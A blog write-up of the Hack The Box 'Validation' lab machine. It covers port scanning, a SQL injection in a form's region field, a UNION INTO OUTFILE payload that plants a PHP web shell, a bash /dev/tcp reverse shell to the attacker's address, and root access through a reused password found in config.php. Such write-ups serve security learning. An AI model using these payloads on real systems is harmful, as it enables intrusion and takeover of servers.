---
title:  "Writeup Validation machine of Hack The Box"
date: 2023-04-16
mathjax: true
layout: post
categories: writeup
tags: sql-injection burpsuite php web-shell
---

# Resolution of Validation machine of Hack The Box

![](https://i.ibb.co/SdzyZRf/validation.png)

### 💉 *"Machine vulnerable to SQL Injection !!"*

**As always, we first check that we have a connection to the victim machine, from our attacking machine. One way to do this is by sending ICMP packets with the "ping" command:**

```bash
ping -c 1 10.10.11.116
```

**We now know that we have a connection to the machine since it responded with the packets we received**.

![](https://i.ibb.co/tMw3TDP/ping.png)

First we do an Active scan of the machine in search of open ports with the following command

```bash
sudo nmap 10.10.11.116 -p- --min-rate 5000 -sS -Pn -oG openPorts -vvv 
```

With the above command we export the result in a format in which we can extract the open ports with the help of commands such as *"grep, awk and others "* and then scan in depth:

```bash
sudo nmap 10.10.11.116 -p22,80,4566,8080 -sV -sC -sS -Pn -oN scanComplete -vvv
```

#### Now with the complete scan we obtain the following result:

![](https://i.ibb.co/HX2nbYG/nmap.png)

As port 80 is open running the http service, we enter in the web browser the IP address of the machine through that port:

*But before continuing with the pentesting of this machine, we add as host "validation.htb" with the IP of the machine (10.10.11.116)*.

![](https://i.ibb.co/ZMB5KXJ/etc-hosts.png)

**We see that we have a simple form, written in HTML with an input that allows us to choose our "Username" as well as the region, which defaults to "Brazil". If we inspect the source code we can see that the <form> i.e. the form, sends the values of the "Username" and the "Region" to the web server. With this we can think that these values are hosted in a Database:**.

![](https://i.ibb.co/nBv2wxC/form-html.png)

## Burp Suite

**Now we configure the FoxyProxy extension in Firefox to redirect the request through our localhost on port 8080 (127.0.0.1:8080). This way we intercept it with Burp Suite and from there follow:**

![](https://i.ibb.co/rdCRMvK/burp-suite.png)

**Now from Burp Suite, we comment the value of the “country” field and inject the code:**

```
or 1=1
```

![](https://i.ibb.co/h1gK15v/sqli-nourl.png)

Then we encode it with URL encoding:

![](https://i.ibb.co/crrD0TR/sqli-url.png)

Now if we go back to the web part, we see that the Backend Error is leaked, which makes us think that it is vulnerable to SQL Injection:

![](https://i.ibb.co/xFDK3xZ/sqli-vulnerable.png)

## Once the vulnerability has been found, we create a Backdoor.

As we can see on the site, the web application uses PHP. We can try to inject a web-shell in PHP through a SQL Injection attack:

*The code we are going to use to add a web-shell with an SQL Injection will be:*

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

*With the previous code we tell the server to also select that fraction of code, (which is the Backdoor), and insert it in the file /var/www/html/shell.php. That is to say that shell.php will be our web-shell in PHP. It is also good to know that normally the web servers that are executed in Linux (these are the majority at the moment, although not all), have as root of web directories the route /var/www/html*.

![](https://i.ibb.co/M8HJL2d/backdoor.png)

## Works!!

We have our web-shell ready in the path /shell.php, now to execute a command in the server we only have to add the following query:

```
shell.php?cmd={comando}
```

![](https://i.ibb.co/3Nc8csP/web-shell.png)

Now we go to [https://www.revshells.com/](https://www.revshells.com/) and generate a payload to execute a Reverse Shell with Netcat and to be able to connect to the server from an interactive console. We execute it as a command in the Backdoor of "shell.php".

After trying several types of shells, it worked for me to add it:

```bash
bash -c '{payload de la shell}'
```

Which would look like this:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.2/4545 0>&1'
```

We encode it as a URL and execute the code in the web-shell, from the browser or from Burp Suite.

**We see in the "config.php" file a password **.

![](https://i.ibb.co/hZfGLGh/config-php.png)

**As we are Pentesters, we have to test all the ways in which the system could be accessed in a privileged way, so we try to use that password to authenticate as root user:** 

## YES! It seems that this is the root password.

![](https://i.ibb.co/NsT0Z4n/flag-root.png)

### And with this we finish the machine and we have full access to the system.

Happy Hacking!!

----

## Author: Mateo Fumis 
